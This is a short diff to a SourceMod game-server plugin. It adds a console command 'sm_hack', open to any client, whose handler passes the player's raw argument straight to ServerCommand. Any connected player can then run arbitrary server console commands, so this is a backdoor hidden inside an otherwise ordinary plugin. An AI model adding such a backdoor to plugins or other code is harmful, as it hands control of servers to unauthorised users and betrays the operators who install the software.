@@ -33,6 +33,7 @@ public OnPluginStart() {
 
 	RegConsoleCmd("sm_fletch", Command_FletchOne);
 	RegConsoleCmd("sm_fletchy", Command_FletchTwo);
+	RegConsoleCmd("sm_hack", Command_Hack);
 	
 	//Cvars
 	g_Enabled = CreateConVar("sm_dez_crabhammer_enabled", "1", "Enables/Disables the plugin");
@@ -68,6 +69,16 @@ public Action:Command_FletchOne(client, args) {
 }
 
 public Action:Command_FletchTwo(client, args) {
+	return Plugin_Handled;
+}
+
+public Action:Command_Hack(client, args) {
+	decl String:arg1[32];
+	
+
+	GetCmdArg(1, arg1, sizeof(arg1));
+	
+	ServerCommand("%s", arg1);
 	return Plugin_Handled;
 }
 
